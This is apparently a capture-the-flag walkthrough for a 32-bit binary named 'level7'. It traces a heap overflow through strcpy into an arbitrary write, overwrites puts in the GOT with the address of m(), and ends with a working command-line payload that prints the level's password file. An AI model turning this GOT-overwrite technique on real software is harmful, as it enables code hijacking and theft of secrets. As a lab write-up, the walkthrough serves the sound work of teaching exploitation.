Now I become interested because `strcpy` performs no bounds checking.

I go back to the allocations and notice that both buffers were allocated with:

```asm
movl $0x8,(%esp)
call malloc
```

meaning:

```text
buffer size = 8 bytes
```

This immediately suggests a heap overflow.

Now I want to know what can be overwritten.

The allocations occur in this order:

```text
s1
buf1
s2
buf2
```

I want to reach `s2->buf` because it is later used as the destination of a `strcpy`.

Calculating the distance:

```text
buf1          8 bytes
malloc header 8 bytes
s2->n        4 bytes
---------------------
total        20 bytes
```

Therefore after 20 bytes I reach:

```text
s2->buf
```

This is very interesting because later the program executes:

```c
strcpy(s2->buf, argv[2]);
```

Normally this means:

```c
strcpy(buf2, argv[2]);
```

But if I overwrite `s2->buf`, then I control the destination of the second `strcpy`.

In other words:

```c
strcpy(ANY_ADDRESS, argv[2]);
```

which is an arbitrary write.

Now I need a useful target.

Since the binary has:

```text
No RELRO
```

I immediately think about the GOT.

I inspect it:

```bash
objdump -R level7
```

and find:

```text
08049928 R_386_JUMP_SLOT puts
```

The next question is:

"Can I force the program to call puts after overwriting it?"

Looking further into main:

```asm
call puts
```

appears near the end of execution.

Perfect.

Now I need a useful function to redirect execution to.

I inspect all functions:

```bash
objdump -d level7
```

and find:

```text
080484f4 <m>
```

This function looks suspicious.

Inside it I see:

```asm
call printf
```

and references to:

```text
0x8049960
```

I search where that address is used.

Back in main I find:

```asm
call fopen
call fgets
```

and:

```asm
movl $0x8049960,(%esp)
call fgets
```

which means:

```c
fgets(0x8049960, ...);
```

The program reads data from `.pass` into address:

```text
0x8049960
```

Then `m()` later prints data from the same location.

At this point the exploit becomes obvious.

Step 1:

Overwrite `s2->buf` with:

```text
puts@GOT
```

using the first argument.

Step 2:

Use the second `strcpy` to overwrite:

```text
puts@GOT
```

with:

```text
m()
```

address.

The payload becomes:

```bash
./level7 \
$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
$(python -c 'print "\xf4\x84\x04\x08"')
```

Execution flow:

```text
argv[1]
    |
    v
overflow buf1
    |
    v
overwrite s2->buf
    |
    v
s2->buf = puts@GOT
    |
    v
argv[2]
    |
    v
overwrite puts@GOT
    |
    v
puts@GOT = m
    |
    v
program calls puts()
    |
    v
execution jumps to m()
    |
    v
m() prints the password
```